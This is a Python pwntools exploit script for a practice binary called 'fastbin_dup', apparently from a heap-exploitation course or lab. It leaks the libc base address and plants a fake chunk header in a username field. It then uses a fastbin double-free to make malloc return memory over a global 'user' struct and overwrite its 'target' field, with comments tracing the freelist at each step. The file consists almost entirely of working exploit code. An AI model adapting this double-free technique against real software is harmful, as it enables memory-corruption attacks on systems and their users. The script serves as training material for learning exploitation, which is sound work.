#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send("2")
    io.sendafter("index: ", f"{index}")
    io.recvuntil("> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# Set the username field (PREV_INUSE + size of fake chunk):
# type = struct user {
#     char username[16];
#     char target[16];
# }

io.sendafter("username: ", p64(0) + p64(0x31))
io.recvuntil("> ")

# Request two 0x30-sized chunks and fill them with data.
chunk_A = malloc(0x28, "A" * 0x28)
chunk_B = malloc(0x28, "B" * 0x28)

# Fastbins[idx=1, size=0x30] <- Chunk(addr=0x603010, size=0x30, flags=PREV_INUSE)
free(chunk_A)

# Fastbins[idx=1, size=0x30] <- Chunk(addr=0x603010, size=0x30, flags=PREV_INUSE) <- Chunk(addr=0x603040, size=0x30, flags=PREV_INUSE) 
free(chunk_B)

# Fastbins[idx=1, size=0x30] <- Chunk(addr=0x603010, size=0x30, flags=PREV_INUSE) <- Chunk(addr=0x603040, size=0x30, flags=PREV_INUSE) <- Chunk(addr=0x603010, size=0x30, flags=PREV_INUSE) -> [loop detected] 
free(chunk_A)

# Fastbins[idx=1, size=0x30] <- Chunk(addr=0x603040, size=0x30, flags=PREV_INUSE) <- Chunk(addr=0x603010, size=0x30, flags=PREV_INUSE) <- Chunk(addr=0x602020, size=0x30, flags=PREV_INUSE) <- Corrupted chunk at 0x58585858585868]
dup = malloc(0x28, p64(elf.sym["user"]))

# Fastbins[idx=1, size=0x30] <- Chunk(addr=0x603010, size=0x30, flags=PREV_INUSE) <- Chunk(addr=0x602020, size=0x30, flags=PREV_INUSE) <- [Corrupted chunk at 0x58585858585868]
malloc(0x28, "Y")

# Fastbins[idx=1, size=0x30] <- Chunk(addr=0x602020, size=0x30, flags=PREV_INUSE) <- [Corrupted chunk at 0x58585858585868]
malloc(0x28, "Y")

# Writing data
malloc(0x28, "Wow, much win")

io.sendline("3")
io.recvuntil("target: ")
log.info(f"target value: {io.recvline()}")
io.sendline("4")
io.recvall()
